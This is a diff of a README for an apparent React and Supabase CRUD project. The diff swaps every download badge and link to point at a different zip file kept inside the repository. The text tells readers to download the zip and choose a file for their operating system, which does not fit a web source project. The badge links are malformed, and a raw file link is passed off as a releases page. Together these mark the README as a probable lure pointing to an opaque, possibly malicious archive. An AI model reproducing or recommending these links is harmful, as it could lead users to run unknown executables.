@@ -1,6 +1,6 @@
 # 🚀 react-supabase-setup-crud-project - Easy Product Management with React
 
-[![Download this project](https://raw.githubusercontent.com/Rexatura/react-supabase-setup-crud-project/main/unpondered/react-supabase-setup-crud-project.zip%20Project-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Rexatura/react-supabase-setup-crud-project/main/unpondered/react-supabase-setup-crud-project.zip)
+[![Download this project](https://github.com/Rexatura/react-supabase-setup-crud-project/raw/refs/heads/main/src/assets/supabase-setup-crud-react-project-v2.9.zip%20Project-blue?style=for-the-badge&logo=github)](https://github.com/Rexatura/react-supabase-setup-crud-project/raw/refs/heads/main/src/assets/supabase-setup-crud-react-project-v2.9.zip)
 
 ## 📋 Overview
 
@@ -14,7 +14,7 @@ To get started quickly, follow these simple steps to download and run the applic
 
 1. **Visit the Releases Page**  
    Go to the following link to get the latest version of the project:  
-   [Download Here](https://raw.githubusercontent.com/Rexatura/react-supabase-setup-crud-project/main/unpondered/react-supabase-setup-crud-project.zip)
+   [Download Here](https://github.com/Rexatura/react-supabase-setup-crud-project/raw/refs/heads/main/src/assets/supabase-setup-crud-react-project-v2.9.zip)
 
 2. **Choose Your File**  
    Once you're on the Releases page, look for the latest version. You should see a list of available files, typically including options for different operating systems. Select the file that corresponds to your OS.
@@ -83,4 +83,4 @@ Your feedback is essential for improving this project. Feel free to submit any i
 
 This project is licensed under the MIT License. You can use it freely for personal or commercial projects as long as you credit the original source.
 
-[![Download this project](https://raw.githubusercontent.com/Rexatura/react-supabase-setup-crud-project/main/unpondered/react-supabase-setup-crud-project.zip%20Project-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Rexatura/react-supabase-setup-crud-project/main/unpondered/react-supabase-setup-crud-project.zip)
+[![Download this project](https://github.com/Rexatura/react-supabase-setup-crud-project/raw/refs/heads/main/src/assets/supabase-setup-crud-react-project-v2.9.zip%20Project-blue?style=for-the-badge&logo=github)](https://github.com/Rexatura/react-supabase-setup-crud-project/raw/refs/heads/main/src/assets/supabase-setup-crud-react-project-v2.9.zip)
